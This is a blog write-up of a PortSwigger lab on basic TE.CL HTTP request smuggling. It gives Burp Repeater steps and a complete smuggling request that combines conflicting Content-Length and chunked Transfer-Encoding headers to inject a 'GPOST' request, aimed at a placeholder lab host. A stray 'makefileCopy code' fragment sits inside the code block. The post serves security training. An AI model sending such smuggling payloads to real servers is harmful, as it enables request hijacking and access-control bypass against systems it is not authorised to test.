---
title: "Lab: HTTP request smuggling, basic TE.CL vulnerability"
datePublished: Sat Aug 24 2024 10:23:46 GMT+0000 (Coordinated Universal Time)
cuid: cm07ztaog00090al59xndgwil
slug: lab-http-request-smuggling-basic-tecl-vulnerability
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1704890315891/14a8c276-8792-4870-bb01-a07b6a0dbdaa.png
tags: application-security, cybersecurity-1, websecurity, burpsuite, portswigger, handson, request-smuggling

---

Lab Scenario: Our mission is to explore and exploit a simulated web application's vulnerability to HTTP request smuggling. We'll use the [TE.CL](http://TE.CL) technique to manipulate the transfer encoding and content length, revealing potential security weaknesses. Let's dive into the step-by-step solution using Burp Suite:

1. **Configuring Burp Repeater:**
    
    * In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
        
2. **Issuing the Smuggling Request:**
    
    * Using Burp Repeater, issue the following request twice:
        
        ```plaintext
        makefileCopy codePOST / HTTP/1.1
        Host: YOUR-LAB-ID.web-security-academy.net
        Content-Type: application/x-www-form-urlencoded
        Content-length: 4
        Transfer-Encoding: chunked
        
        5c
        GPOST / HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 15
        
        x=1
        0
        ```
        
    * Note: Include the trailing sequence `\r\n\r\n` following the final `0`.
        
3. **Observing the Response:**
    
    * The second response should indicate: "Unrecognized method GPOST."
        

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1704982347342/3686bb23-fb32-455e-8ff0-180c9f344cda.png align="center")

**Conclusion**: This lab exercise provides hands-on experience in exploiting a basic [TE.CL](http://TE.CL) vulnerability, showcasing the potential risks associated with HTTP request smuggling. By following this step-by-step guide, users can enhance their understanding of how attackers manipulate transfer encoding and content length to smuggle malicious requests. Stay informed, keep learning, and continue exploring the dynamic field of cybersecurity to contribute to a more secure online environment.

**Reference:**

[https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)